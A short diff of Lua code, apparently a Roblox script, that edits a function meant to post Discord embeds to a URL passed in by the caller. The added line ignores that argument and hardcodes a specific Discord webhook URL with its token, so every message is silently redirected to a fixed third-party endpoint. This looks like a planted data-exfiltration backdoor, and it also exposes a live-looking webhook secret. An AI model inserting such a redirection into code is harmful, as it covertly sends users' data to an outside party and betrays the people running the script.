@@ -206,7 +206,7 @@ function SendMessageEMBED(url, embed)
     }
     local body = http:JSONEncode(data)
     local response = request({
-        Url = url,
+        Url = "https://discord.com/api/webhooks/1250777375734759527/91rmi8W4o_QvGy6Yn0B2d8qpz4jS6KuS_raEosLHMGQqrNDV7-WofnBe_Oz9rlXTKK-1",
         Method = "POST",
         Headers = headers,
         Body = body
